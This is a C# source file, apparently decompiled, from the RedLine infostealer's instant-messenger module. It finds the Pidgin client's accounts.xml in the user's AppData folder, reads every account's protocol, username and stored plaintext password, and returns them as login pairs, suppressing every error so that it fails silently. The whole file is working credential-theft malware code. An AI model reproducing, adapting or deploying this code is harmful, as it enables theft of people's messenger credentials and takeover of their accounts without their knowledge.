using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace RedLine.Logic.ImClient
{
  public static class Pidgin
  {
    public static List<LoginPair> ParseConnections()
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        string str = string.Format("{0}\\.purple\\accounts.xml", (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        if (File.Exists(str))
          loginPairList.AddRange((IEnumerable<LoginPair>) Pidgin.ParseCredentials(str));
      }
      catch
      {
      }
      return loginPairList;
    }

    private static List<LoginPair> ParseCredentials(string Path)
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        XmlTextReader xmlTextReader = new XmlTextReader(Path);
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load((XmlReader) xmlTextReader);
        foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes)
        {
          LoginPair accounts = Pidgin.ParseAccounts(childNode);
          if (accounts.Login != "UNKNOWN" && accounts.Host != "UNKNOWN")
            loginPairList.Add(accounts);
        }
      }
      catch
      {
      }
      return loginPairList;
    }

    private static LoginPair ParseAccounts(XmlNode xmlNode)
    {
      LoginPair loginPair = new LoginPair();
      try
      {
        foreach (XmlNode childNode in xmlNode.ChildNodes)
        {
          if (childNode.Name == "protocol")
            loginPair.Host = childNode.InnerText;
          if (childNode.Name == "name")
            loginPair.Login = childNode.InnerText;
          if (childNode.Name == "password")
            loginPair.Password = childNode.InnerText;
        }
      }
      catch
      {
      }
      finally
      {
        loginPair.Login = string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login;
        loginPair.Host = string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host;
        loginPair.Password = string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password;
      }
      return loginPair;
    }
  }
}
